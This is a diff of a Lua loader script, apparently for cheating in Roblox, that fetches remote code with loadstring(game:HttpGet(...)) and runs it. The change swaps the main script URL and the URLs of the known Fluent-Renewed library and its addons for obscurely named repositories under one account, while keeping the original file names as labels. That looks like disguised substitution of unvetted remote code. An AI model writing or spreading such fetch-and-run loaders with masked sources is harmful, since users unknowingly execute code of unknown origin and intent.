@@ -42,7 +42,7 @@ local function safeLoad(url, name)
     return result
 end
 
-local mainScriptUrl = "https://raw.githubusercontent.com/sdhnjkf/ww/refs/heads/main/w"
+local mainScriptUrl = "https://raw.githubusercontent.com/sdhnjkf/wwwwwwwwww/refs/heads/main/wd"
 local mainSuccess, mainResult = pcall(function()
     return loadstring(game:HttpGet(mainScriptUrl))()
 end)
@@ -55,9 +55,9 @@ end
 
 print("✅ Script principal chargé avec succès!")
 
-local Library = safeLoad("https://raw.githubusercontent.com/azenbest/Fluent-Renewed/main/Fluent.lua", "Fluent.lua")
-local SaveManager = safeLoad("https://raw.githubusercontent.com/ActualMasterOogway/Fluent-Renewed/master/Addons/SaveManager.luau", "SaveManager.luau")
-local InterfaceManager = safeLoad("https://raw.githubusercontent.com/ActualMasterOogway/Fluent-Renewed/master/Addons/InterfaceManager.luau", "InterfaceManager.luau")
+local Library = safeLoad("https://raw.githubusercontent.com/sdhnjkf/hdfgjfgs/refs/heads/main/awfsa", "Fluent.lua")
+local SaveManager = safeLoad("https://raw.githubusercontent.com/sdhnjkf/gsrdfhgdfghj/refs/heads/main/loalw", "SaveManager.luau")
+local InterfaceManager = safeLoad("https://raw.githubusercontent.com/sdhnjkf/interfawf/refs/heads/main/www", "InterfaceManager.luau")
 
 if not (Library and SaveManager and InterfaceManager) then
     warn("❌ Une ou plusieurs bibliothèques n'ont pas pu être chargées. Arrêt du script.")
